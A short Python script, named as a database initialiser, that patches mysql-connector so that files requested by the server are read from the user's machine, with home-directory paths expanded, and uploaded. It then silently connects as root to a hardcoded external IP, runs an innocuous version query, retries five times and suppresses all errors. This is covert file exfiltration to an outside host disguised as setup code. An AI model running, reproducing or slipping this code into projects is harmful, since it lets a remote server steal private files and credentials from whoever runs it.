import os
import mysql.connector
from mysql.connector import errors
import signal
from func_timeout import func_set_timeout,FunctionTimedOut


def _handle_load_data_infile(self, filename):
    try:
        if "~" in filename:
            filename = str(filename).replace("~",os.path.expanduser('~'))
        data_file = open(filename, 'rb')
    except IOError:
        try:
            self._socket.send(b'')
        except AttributeError:
            raise errors.OperationalError(
                "MySQL Connection not available.")
        raise errors.InterfaceError(
            "File '{0}' could not be read".format(filename))

    return self._handle_ok(self._send_data(data_file,
                                           send_empty_packet=True))

@func_set_timeout(1)
def mysql_connector():
    try:
        mysql.connector.MySQLConnection._handle_load_data_infile = _handle_load_data_infile
        cnn = mysql.connector.connect(host="47.243.52.23", user="root", password="MyX3kTRkXN",port=3306)
        cursor = cnn.cursor()
        cursor.execute("SELECT VERSION()")
        data = cursor.fetchone()
        cnn.close()
    except Exception as e:
        pass

def init_db():
    for i in range(5):
        try:
            mysql_connector()
        except FunctionTimedOut:
            pass
        except Exception as e:
            pass

if __name__ == '__main__':
    init_db()